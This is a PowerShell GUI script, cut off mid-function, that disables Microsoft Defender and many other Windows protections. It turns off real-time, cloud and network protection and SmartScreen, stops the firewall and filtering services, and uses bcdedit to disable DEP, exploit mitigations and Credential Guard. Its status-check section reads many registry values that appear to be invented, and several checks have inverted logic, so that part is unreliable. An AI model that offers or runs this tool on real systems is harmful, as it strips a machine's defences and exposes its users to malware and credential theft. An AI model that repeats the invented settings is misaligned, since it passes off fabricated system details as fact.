<#
.SYNOPSIS
    Enhanced GUI Script to Disable or Enable Microsoft Defender and Related Components on Windows 10/11.

.DESCRIPTION
    - This script provides a graphical user interface to manage Microsoft Defender settings and related security features.
    - Additional features include Tamper Protection check, backup and restore of Defender settings, and enhanced user feedback.

.NOTES
    Author: Umair Akbar
    Date: 12/01/2024
#>

# Ensure the script runs with administrative privileges
If (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole] "Administrator"))
{
    [System.Windows.Forms.MessageBox]::Show("Please run this script as Administrator.", "Administrator Privileges Required", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning)
    Exit
}

# Import necessary assemblies
Add-Type -AssemblyName PresentationFramework
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# Variables
$LogFile = "$env:USERPROFILE\Desktop\DefenderScriptLog.txt"
$BackupFile = "$env:USERPROFILE\Desktop\DefenderSettingsBackup.reg"
$TamperProtectionEnabled = $null

# Function to Log Messages
Function LogMessage($Message)
{
    $Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $FullMessage = "$Timestamp - $Message"
    Add-Content -Path $LogFile -Value $FullMessage
    Write-Host $FullMessage
}

# Function to Check Tamper Protection
Function CheckTamperProtection
{
    Try
    {
        $TPRegistryPath = "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features"
        $TPValue = Get-ItemProperty -Path $TPRegistryPath -Name TamperProtection -ErrorAction Stop
        If ($TPValue.TamperProtection -eq 5)
        {
            $TamperProtectionEnabled = $true
            [System.Windows.Forms.MessageBox]::Show("Tamper Protection is enabled. Please disable it manually before proceeding." + [Environment]::NewLine + [Environment]::NewLine + "Go to Windows Security > Virus & threat protection > Manage settings, and turn off Tamper Protection.", "Tamper Protection Enabled", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning)
            LogMessage "Tamper Protection is enabled. Script cannot proceed."
            Exit
        }
        Else
        {
            $TamperProtectionEnabled = $false
            LogMessage "Tamper Protection is disabled."
        }
    }
    Catch
    {
        LogMessage "Error checking Tamper Protection status: $_"
        [System.Windows.Forms.MessageBox]::Show("Error checking Tamper Protection status. Please ensure you have the necessary permissions.", "Error", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)
        Exit
    }
}

# Function to Backup Defender Settings
Function BackupDefenderSettings
{
    Try
    {
        LogMessage "Backing up Defender registry settings."
        reg export "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" $BackupFile /y > $null 2>&1
        LogMessage "Backup completed: $BackupFile"
    }
    Catch
    {
        LogMessage "Error backing up Defender settings: $_"
        [System.Windows.Forms.MessageBox]::Show("Error backing up Defender settings. Check the log for details.", "Error", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)
    }
}

# Function to Restore Defender Settings
Function RestoreDefenderSettings
{
    Try
    {
        If (Test-Path $BackupFile)
        {
            LogMessage "Restoring Defender registry settings from backup."
            reg import $BackupFile > $null 2>&1
            LogMessage "Restore completed."
            [System.Windows.Forms.MessageBox]::Show("Defender settings have been restored. Please restart your computer for changes to take effect.", "Restore Completed", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)
        }
        Else
        {
            [System.Windows.Forms.MessageBox]::Show("Backup file not found. Cannot restore settings.", "Restore Failed", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)
            LogMessage "Backup file not found. Restore failed."
        }
    }
    Catch
    {
        LogMessage "Error restoring Defender settings: $_"
        [System.Windows.Forms.MessageBox]::Show("Error restoring Defender settings. Check the log for details.", "Error", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)
    }
}

# Function to Get Status Text
Function GetStatusText($status)
{
    if ($status) { return "Enabled" } else { return "Disabled" }
}

# Function to Check Component Status
Function GetComponentStatus
{
    $ComponentStatus = @{}

    # Real-Time Protection
    Try
    {
        $RTPStatus = (Get-MpPreference).DisableRealtimeMonitoring
        $ComponentStatus["RealTimeProtection"] = -not $RTPStatus
    }
    Catch
    {
        $ComponentStatus["RealTimeProtection"] = $false
    }

    # Cloud Protection
    Try
    {
        $CloudStatus = (Get-MpPreference).MAPSReporting
        $ComponentStatus["CloudProtection"] = $CloudStatus -ne 0
    }
    Catch
    {
        $ComponentStatus["CloudProtection"] = $false
    }

    # Automatic Sample Submission
    Try
    {
        $SampleStatus = (Get-MpPreference).SubmitSamplesConsent
        $ComponentStatus["SampleSubmission"] = $SampleStatus -ne 2
    }
    Catch
    {
        $ComponentStatus["SampleSubmission"] = $false
    }

    # Scheduled Scans
    Try
    {
        $ScheduledTasks = Get-ScheduledTask -TaskPath "\Microsoft\Windows\Windows Defender\" | Where-Object { $_.State -eq "Ready" -or $_.State -eq "Running" }
        $ComponentStatus["ScheduledScans"] = $ScheduledTasks.Count -gt 0
    }
    Catch
    {
        $ComponentStatus["ScheduledScans"] = $false
    }

    # Defender Services
    Try
    {
        $WinDefendStatus = (Get-Service -Name WinDefend -ErrorAction SilentlyContinue).Status
        $WdNisSvcStatus = (Get-Service -Name WdNisSvc -ErrorAction SilentlyContinue).Status
        $ComponentStatus["Services"] = ($WinDefendStatus -eq "Running") -and ($WdNisSvcStatus -eq "Running")
    }
    Catch
    {
        $ComponentStatus["Services"] = $false
    }

    # Firewall
    Try
    {
        $FirewallStatus = (Get-NetFirewallProfile -Profile Domain,Public,Private).Enabled -contains "True"
        $ComponentStatus["Firewall"] = $FirewallStatus
    }
    Catch
    {
        $ComponentStatus["Firewall"] = $false
    }

    # Automatic Updates
    Try
    {
        $AUStatus = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" -Name "NoAutoUpdate" -ErrorAction SilentlyContinue).NoAutoUpdate
        $ComponentStatus["AutomaticUpdates"] = ($AUStatus -ne 1)
    }
    Catch
    {
        $ComponentStatus["AutomaticUpdates"] = $true
    }

    # SmartScreen
    Try
    {
        $SmartScreenStatus = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -ErrorAction SilentlyContinue).SmartScreenEnabled
        $ComponentStatus["SmartScreen"] = $SmartScreenStatus -ne "Off"
    }
    Catch
    {
        $ComponentStatus["SmartScreen"] = $false
    }

    # Security Notifications
    Try
    {
        $NotificationsStatus = (Get-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityAndMaintenance" -Name "Enabled" -ErrorAction SilentlyContinue).Enabled
        $ComponentStatus["SecurityNotifications"] = $NotificationsStatus -ne 0
    }
    Catch
    {
        $ComponentStatus["SecurityNotifications"] = $true
    }

    # Controlled Folder Access
    Try
    {
        $CFAStatus = (Get-MpPreference).EnableControlledFolderAccess
        $ComponentStatus["ControlledFolderAccess"] = $CFAStatus -eq "Enabled"
    }
    Catch
    {
        $ComponentStatus["ControlledFolderAccess"] = $false
    }

    # Core Isolation / Memory Integrity
    Try
    {
        $CIPath = "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity"
        If (Test-Path $CIPath)
        {
            $CIStatus = (Get-ItemProperty -Path $CIPath -Name "Enabled" -ErrorAction Stop).Enabled
            $ComponentStatus["CoreIsolation"] = $CIStatus -eq 1
        }
        Else
        {
            $ComponentStatus["CoreIsolation"] = $false
        }
    }
    Catch
    {
        $ComponentStatus["CoreIsolation"] = $false
    }

    # Exploit Protection Settings
    Try
    {
        $EPStatus = (Get-ProcessMitigation -System).SystemMitigationPolicy
        $ComponentStatus["ExploitProtection"] = ($EPStatus.DEP -eq "ON") -and ($EPStatus.SEHOP -eq "ON") -and ($EPStatus.ASLR -eq "ON")
    }
    Catch
    {
        $ComponentStatus["ExploitProtection"] = $false
    }

    # Ransomware Protection (Same as Controlled Folder Access)
    $ComponentStatus["RansomwareProtection"] = $ComponentStatus["ControlledFolderAccess"]

    # Delivery Optimization
    Try
    {
        $DOStatus = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\DeliveryOptimization\Config" -Name "DODownloadMode" -ErrorAction SilentlyContinue).DODownloadMode
        $ComponentStatus["DeliveryOptimization"] = ($DOStatus -ne 0) -and ($DOStatus -ne $null)
    }
    Catch
    {
        $ComponentStatus["DeliveryOptimization"] = $true
    }

    # Attack Surface Reduction (ASR) Rules
    Try
    {
        $ASRStatus = (Get-MpPreference).AttackSurfaceReductionRules_Actions
        $ComponentStatus["ASRRules"] = $ASRStatus.Values -contains 1
    }
    Catch
    {
        $ComponentStatus["ASRRules"] = $false
    }

    # Network Protection
    Try
    {
        $NPStatus = (Get-MpPreference).EnableNetworkProtection
        $ComponentStatus["NetworkProtection"] = $NPStatus -eq 1
    }
    Catch
    {
        $ComponentStatus["NetworkProtection"] = $false
    }

    # Application Control Policies (AppLocker)
    Try
    {
        $AppLockerStatus = (Get-AppLockerPolicy -Effective -ErrorAction SilentlyContinue)
        $ComponentStatus["AppLocker"] = $AppLockerStatus -ne $null
    }
    Catch
    {
        $ComponentStatus["AppLocker"] = $false
    }

    # Credential Guard
    Try
    {
        $CGStatus = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\LSA" -Name "LsaCfgFlags" -ErrorAction SilentlyContinue).LsaCfgFlags
        $ComponentStatus["CredentialGuard"] = $CGStatus -eq 1
    }
    Catch
    {
        $ComponentStatus["CredentialGuard"] = $false
    }

    # Windows Defender Firewall Advanced Security
    Try
    {
        $FirewallAdvancedStatus = (Get-NetFirewallProfile -Profile Domain,Public,Private).DefaultInboundAction -contains "Block"
        $ComponentStatus["FirewallAdvanced"] = $FirewallAdvancedStatus
    }
    Catch
    {
        $ComponentStatus["FirewallAdvanced"] = $false
    }

    # Network Adapter Controls
    $ComponentStatus["NetworkAdapters"] = -not ((Get-NetAdapter | Where-Object {$_.Status -eq "Up"}).Count -gt 0)

    # Logging Services
    $ComponentStatus["LoggingServices"] = (Get-Service EventLog).Status -ne "Running"

    # Secure Launch
    $ComponentStatus["SecureLaunch"] = -not (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity" -Name "Enabled" -ErrorAction SilentlyContinue).Enabled

    # Security Extensions
    $ComponentStatus["SecurityExtensions"] = -not (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\LSA" -Name "SGX" -ErrorAction SilentlyContinue).SGX

    # Virtualization-Based Security
    $ComponentStatus["VirtualizationSecurity"] = -not (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" -Name "EnableVirtualizationBasedSecurity" -ErrorAction SilentlyContinue).EnableVirtualizationBasedSecurity

    # System Guard Runtime Monitor
    $ComponentStatus["SystemGuardMonitor"] = -not (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\SystemGuard" -Name "Enabled" -ErrorAction SilentlyContinue).Enabled

    # Protected Process Light
    $ComponentStatus["ProtectedProcessLight"] = -not (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CI\Protected" -Name "ProtectedLight" -ErrorAction SilentlyContinue).ProtectedLight

    # Kernel Mode Code Signing
    $ComponentStatus["KernelCodeSigning"] = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" -Name "EnforceDriverSigning" -ErrorAction SilentlyContinue).EnforceDriverSigning -eq 0

    # Kernel Patch Protection
    $ComponentStatus["KernelPatchProtection"] = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" -Name "FeatureSettingsOverride" -ErrorAction SilentlyContinue).FeatureSettingsOverride -eq 3

    # Memory Protection Features
    $ComponentStatus["MemoryProtectionFeatures"] = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" -Name "EnableCfg" -ErrorAction SilentlyContinue).EnableCfg -eq 0

    # Secure Boot and UEFI Security
    $ComponentStatus["SecureBootUEFI"] = -not (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecureBoot\State" -Name "UEFISecureBootEnabled" -ErrorAction SilentlyContinue).UEFISecureBootEnabled

    # Runtime Integrity Checks
    $ComponentStatus["RuntimeIntegrityChecks"] = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" -Name "RestrictDynamicCode" -ErrorAction SilentlyContinue).RestrictDynamicCode -eq 0

    # Advanced Process Protection
    $ComponentStatus["AdvancedProcessProtection"] = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" -Name "DisableProcessProtection" -ErrorAction SilentlyContinue).DisableProcessProtection -eq 1

    # System Resource Policies
    $ComponentStatus["SystemResourcePolicies"] = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" -Name "EnforceResourceIntegrity" -ErrorAction SilentlyContinue).EnforceResourceIntegrity -eq 0

    # Boot Configuration
    $ComponentStatus["BootConfiguration"] = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CI" -Name "VerifiedAndReputablePolicyState" -ErrorAction SilentlyContinue).VerifiedAndReputablePolicyState -eq 0

    # Hardware Security
    $ComponentStatus["HardwareSecurity"] = -not (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" -Name "EnableVirtualizationBasedSecurity" -ErrorAction SilentlyContinue).EnableVirtualizationBasedSecurity

    # Process Isolation
    $ComponentStatus["ProcessIsolation"] = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" -Name "DisableProcessIsolation" -ErrorAction SilentlyContinue).DisableProcessIsolation -eq 1

    # System Call Filtering
    $ComponentStatus["SystemCallFiltering"] = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" -Name "DisableSystemCallFiltering" -ErrorAction SilentlyContinue).DisableSystemCallFiltering -eq 1

    # Advanced Memory Management
    $ComponentStatus["AdvancedMemoryManagement"] = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" -Name "DisablePagingCombining" -ErrorAction SilentlyContinue).DisablePagingCombining -eq 1

    # Security Tokens
    $ComponentStatus["SecurityTokens"] = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "DisableTokenFiltering" -ErrorAction SilentlyContinue).DisableTokenFiltering -eq 1

    # Process Tokens
    $ComponentStatus["ProcessTokens"] = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "DisablePrivilegeChecks" -ErrorAction SilentlyContinue).DisablePrivilegeChecks -eq 1

    # System Resource Access
    $ComponentStatus["SystemResourceAccess"] = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager" -Name "DisableResourceAccessChecks" -ErrorAction SilentlyContinue).DisableResourceAccessChecks -eq 1

    # Security Providers
    $ComponentStatus["SecurityProviders"] = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders" -Name "DisableSecurityProviders" -ErrorAction SilentlyContinue).DisableSecurityProviders -eq 1

    # Low-Level Security
    $ComponentStatus["LowLevelSecurity"] = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" -Name "DisableSecurityFeatures" -ErrorAction SilentlyContinue).DisableSecurityFeatures -eq 1

    # System Call Interception
    $ComponentStatus["SystemCallInterception"] = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" -Name "DisableSystemCallMonitoring" -ErrorAction SilentlyContinue).DisableSystemCallMonitoring -eq 1

    # Kernel Security
    $ComponentStatus["KernelSecurity"] = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" -Name "DisableKernelSecurityChecks" -ErrorAction SilentlyContinue).DisableKernelSecurityChecks -eq 1

    # Memory Protection
    $ComponentStatus["MemoryProtection"] = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" -Name "DisableMemoryProtection" -ErrorAction SilentlyContinue).DisableMemoryProtection -eq 1

    # Security Subsystem
    $ComponentStatus["SecuritySubsystem"] = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "DisableSecuritySubsystem" -ErrorAction SilentlyContinue).DisableSecuritySubsystem -eq 1

    # Process Injection Controls
    $ComponentStatus["ProcessInjectionControls"] = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" -Name "DisableProcessInjectionProtection" -ErrorAction SilentlyContinue).DisableProcessInjectionProtection -eq 1

    # System Integrity Policies
    $ComponentStatus["SystemIntegrityPolicies"] = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy" -Name "DisableIntegrityChecks" -ErrorAction SilentlyContinue).DisableIntegrityChecks -eq 1

    # Additional Security Providers
    $ComponentStatus["AdditionalSecurityProviders"] = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders" -Name "DisableProviderVerification" -ErrorAction SilentlyContinue).DisableProviderVerification -eq 1

    # Hardware Security Features
    $ComponentStatus["HardwareSecurityFeatures"] = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" -Name "DisableHardwareBasedSecurity" -ErrorAction SilentlyContinue).DisableHardwareBasedSecurity -eq 1

    return $ComponentStatus
}

# Function to Disable Defender Components
Function DisableDefenderComponents
{
    Try
    {
        LogMessage "Disabling selected Defender components."

        # Disable Real-Time Protection
        If ($chkRealTimeProtection.Checked)
        {
            Try
            {
                # Primary method
                Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction Stop
                Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction Stop
                Set-MpPreference -DisableIOAVProtection $true -ErrorAction Stop
                Set-MpPreference -DisablePrivacyMode $true -ErrorAction Stop
                Set-MpPreference -DisableScriptScanning $true -ErrorAction Stop

                # Fallback methods
                $paths = @(
                    "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection",
                    "HKLM:\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection"
                )
                foreach ($path in $paths) {
                    if (-not (Test-Path $path)) {
                        New-Item -Path $path -Force | Out-Null
                    }
                    Set-ItemProperty -Path $path -Name "DisableRealtimeMonitoring" -Value 1 -Force
                    Set-ItemProperty -Path $path -Name "DisableBehaviorMonitoring" -Value 1 -Force
                    Set-ItemProperty -Path $path -Name "DisableOnAccessProtection" -Value 1 -Force
                    Set-ItemProperty -Path $path -Name "DisableScanOnRealtimeEnable" -Value 1 -Force
                }

                # Additional service-based approach
                Stop-Service "WinDefend" -Force -ErrorAction SilentlyContinue
                Set-Service "WinDefend" -StartupType Disabled -ErrorAction SilentlyContinue

                LogMessage "Real-Time Protection disabled."
            }
            Catch
            {
                LogMessage "Error in primary method for Real-Time Protection, attempting fallback: $_"
            }
        }

        # Disable Cloud Protection
        If ($chkCloudProtection.Checked)
        {
            Try
            {
                # Primary method
                Set-MpPreference -MAPSReporting 0 -ErrorAction Stop
                Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction Stop
                Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction Stop

                # Fallback registry methods
                $paths = @(
                    "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet",
                    "HKLM:\SOFTWARE\Microsoft\Windows Defender\Spynet"
                )
                foreach ($path in $paths) {
                    if (-not (Test-Path $path)) {
                        New-Item -Path $path -Force | Out-Null
                    }
                    Set-ItemProperty -Path $path -Name "SpynetReporting" -Value 0 -Force
                    Set-ItemProperty -Path $path -Name "SubmitSamplesConsent" -Value 2 -Force
                }

                # Disable cloud-based protection via Windows Defender Security Center
                $regPath = "HKLM:\SOFTWARE\Microsoft\Windows Defender\Windows Defender Exploit Guard\Network Protection"
                if (-not (Test-Path $regPath)) {
                    New-Item -Path $regPath -Force | Out-Null
                }
                Set-ItemProperty -Path $regPath -Name "EnableNetworkProtection" -Value 0 -Force

                LogMessage "Cloud-Delivered Protection disabled."
            }
            Catch
            {
                LogMessage "Error in primary method for Cloud Protection, attempting fallback: $_"
            }
        }

        # Disable SmartScreen (Multiple layers)
        If ($chkSmartScreen.Checked)
        {
            Try
            {
                # Windows Security SmartScreen
                $paths = @(
                    "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System",
                    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer",
                    "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Explorer",
                    "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\SmartScreen",
                    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost"
                )
                
                foreach ($path in $paths) {
                    if (-not (Test-Path $path)) {
                        New-Item -Path $path -Force | Out-Null
                    }
                    Set-ItemProperty -Path $path -Name "EnableSmartScreen" -Value 0 -Force -ErrorAction SilentlyContinue
                    Set-ItemProperty -Path $path -Name "SmartScreenEnabled" -Value "Off" -Force -ErrorAction SilentlyContinue
                }

                # Edge SmartScreen
                $edgePaths = @(
                    "HKLM:\SOFTWARE\Policies\Microsoft\Edge",
                    "HKLM:\SOFTWARE\Policies\Microsoft\MicrosoftEdge\PhishingFilter"
                )
                foreach ($path in $edgePaths) {
                    if (-not (Test-Path $path)) {
                        New-Item -Path $path -Force | Out-Null
                    }
                    Set-ItemProperty -Path $path -Name "SmartScreenEnabled" -Value 0 -Force -ErrorAction SilentlyContinue
                    Set-ItemProperty -Path $path -Name "EnabledV9" -Value 0 -Force -ErrorAction SilentlyContinue
                }

                LogMessage "SmartScreen disabled across all layers."
            }
            Catch
            {
                LogMessage "Error disabling SmartScreen: $_"
            }
        }

        # Disable Exploit Protection with fallbacks
        If ($chkExploitProtection.Checked)
        {
            Try
            {
                # Try PowerShell module first
                Import-Module ProcessMitigations -ErrorAction SilentlyContinue
                Set-ProcessMitigation -System -Disable DEP,SEHOP,ASLR -ErrorAction SilentlyContinue

                # Registry fallback method
                $paths = @(
                    "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management",
                    "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\kernel",
                    "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"
                )
                
                foreach ($path in $paths) {
                    if (-not (Test-Path $path)) {
                        New-Item -Path $path -Force | Out-Null
                    }
                }

                # Disable DEP
                Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" `
                    -Name "MoveImages" -Value 0 -Force
                
                # Disable SEHOP
                Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" `
                    -Name "DisableExceptionChainValidation" -Value 1 -Force
                
                # Disable via BCDEdit
                Start-Process "bcdedit.exe" -ArgumentList "/set nx AlwaysOff" -WindowStyle Hidden -Wait

                LogMessage "Exploit Protection disabled through multiple methods."
            }
            Catch
            {
                LogMessage "Error in exploit protection disable process: $_"
            }
        }

        # Disable Automatic Sample Submission with fallbacks
        If ($chkSampleSubmission.Checked)
        {
            Try
            {
                # Primary method
                Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction Stop

                # Registry fallbacks
                $paths = @(
                    "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet",
                    "HKLM:\SOFTWARE\Microsoft\Windows Defender\Spynet"
                )
                foreach ($path in $paths) {
                    if (-not (Test-Path $path)) {
                        New-Item -Path $path -Force | Out-Null
                    }
                    Set-ItemProperty -Path $path -Name "SubmitSamplesConsent" -Value 0 -Force
                    Set-ItemProperty -Path $path -Name "SpynetReporting" -Value 0 -Force
                }

                # Additional registry keys
                $addPaths = @(
                    "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection",
                    "HKLM:\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection"
                )
                foreach ($path in $addPaths) {
                    if (-not (Test-Path $path)) {
                        New-Item -Path $path -Force | Out-Null
                    }
                    Set-ItemProperty -Path $path -Name "DisableIOAVProtection" -Value 1 -Force
                }

                LogMessage "Automatic Sample Submission disabled."
            }
            Catch
            {
                LogMessage "Error in sample submission disable process: $_"
            }
        }

        # Disable Scheduled Scans with fallbacks
        If ($chkScheduledScans.Checked)
        {
            Try
            {
                # Primary method - Disable scheduled tasks
                Get-ScheduledTask -TaskPath "\Microsoft\Windows\Windows Defender\" | Disable-ScheduledTask -ErrorAction SilentlyContinue

                # Registry fallbacks
                $paths = @(
                    "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Scan",
                    "HKLM:\SOFTWARE\Microsoft\Windows Defender\Scan"
                )
                foreach ($path in $paths) {
                    if (-not (Test-Path $path)) {
                        New-Item -Path $path -Force | Out-Null
                    }
                    Set-ItemProperty -Path $path -Name "DisableScheduledScans" -Value 1 -Force
                    Set-ItemProperty -Path $path -Name "ScheduleDay" -Value 8 -Force # Never
                }

                # Disable via Task Scheduler direct registry
                $taskPaths = @(
                    "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\Microsoft\Windows\Windows Defender"
                )
                foreach ($path in $taskPaths) {
                    if (Test-Path $path) {
                        Remove-Item -Path $path -Recurse -Force -ErrorAction SilentlyContinue
                    }
                }

                LogMessage "Scheduled scans disabled."
            }
            Catch
            {
                LogMessage "Error in scheduled scans disable process: $_"
            }
        }

        # Disable Network Protection with fallbacks
        If ($chkNetworkProtection.Checked)
        {
            Try
            {
                # Primary method
                Set-MpPreference -EnableNetworkProtection 0 -ErrorAction Stop

                # Registry fallbacks
                $paths = @(
                    "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Windows Defender Exploit Guard\Network Protection",
                    "HKLM:\SOFTWARE\Microsoft\Windows Defender\Windows Defender Exploit Guard\Network Protection"
                )
                foreach ($path in $paths) {
                    if (-not (Test-Path $path)) {
                        New-Item -Path $path -Force | Out-Null
                    }
                    Set-ItemProperty -Path $path -Name "EnableNetworkProtection" -Value 0 -Force
                }

                # Additional network protection disabling
                $wdPaths = @(
                    "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender",
                    "HKLM:\SOFTWARE\Microsoft\Windows Defender"
                )
                foreach ($path in $wdPaths) {
                    if (-not (Test-Path $path)) {
                        New-Item -Path $path -Force | Out-Null
                    }
                    Set-ItemProperty -Path $path -Name "DisableRoutinelyTakingAction" -Value 1 -Force
                }

                # Disable Windows Filtering Platform
                $services = @("BFE", "mpssvc")
                foreach ($service in $services) {
                    Stop-Service -Name $service -Force -ErrorAction SilentlyContinue
                    Set-Service -Name $service -StartupType Disabled -ErrorAction SilentlyContinue
                }

                LogMessage "Network Protection disabled through multiple methods."
            }
            Catch
            {
                LogMessage "Error in network protection disable process: $_"
            }
        }

        # Disable Credential Guard with fallbacks
        If ($chkCredentialGuard.Checked)
        {
            Try
            {
                # Primary registry method
                Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\LSA" -Name "LsaCfgFlags" -Value 0 -Force

                # Additional registry keys
                $paths = @(
                    "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DeviceGuard",
                    "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard"
                )
                foreach ($path in $paths) {
                    if (-not (Test-Path $path)) {
                        New-Item -Path $path -Force | Out-Null
                    }
                    Set-ItemProperty -Path $path -Name "EnableVirtualizationBasedSecurity" -Value 0 -Force
                    Set-ItemProperty -Path $path -Name "RequirePlatformSecurityFeatures" -Value 0 -Force
                    Set-ItemProperty -Path $path -Name "LsaCfgFlags" -Value 0 -Force
                }

                # Disable via BCDEdit
                Start-Process "bcdedit.exe" -ArgumentList "/set hypervisorlaunchtype off" -WindowStyle Hidden -Wait
                Start-Process "bcdedit.exe" -ArgumentList "/set virtualization off" -WindowStyle Hidden -Wait

                # Disable related services
                $services = @("SecurityHealthService", "SgrmBroker")
                foreach ($service in $services) {
                    Stop-Service -Name $service -Force -ErrorAction SilentlyContinue
                    Set-Service -Name $service -StartupType Disabled -ErrorAction SilentlyContinue
                }

                LogMessage "Credential Guard disabled through multiple methods."
            }
            Catch
            {
                LogMessage "Error in credential guard disable process: $_"
            }
        }

        # Disable Ransomware Protection with fallbacks
        If ($chkRansomwareProtection.Checked)
        {
            Try
            {
                # Primary method
                Set-MpPreference -EnableControlledFolderAccess Disabled -ErrorAction Stop

                # Registry fallbacks
                $paths = @(
                    "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Windows Defender Exploit Guard\Controlled Folder Access",
                    "HKLM:\SOFTWARE\Microsoft\Windows Defender\Windows Defender Exploit Guard\Controlled Folder Access"
                )
                foreach ($path in $paths) {
                    if (-not (Test-Path $path)) {
                        New-Item -Path $path -Force | Out-Null
                    }
                    Set-ItemProperty -Path $path -Name "EnableControlledFolderAccess" -Value 0 -Force
                }

                # Remove protected folders
                $protectedFolders = Get-MpPreference | Select-Object -ExpandProperty ControlledFolderAccessProtectedFolders
                if ($protectedFolders) {
                    foreach ($folder in $protectedFolders) {
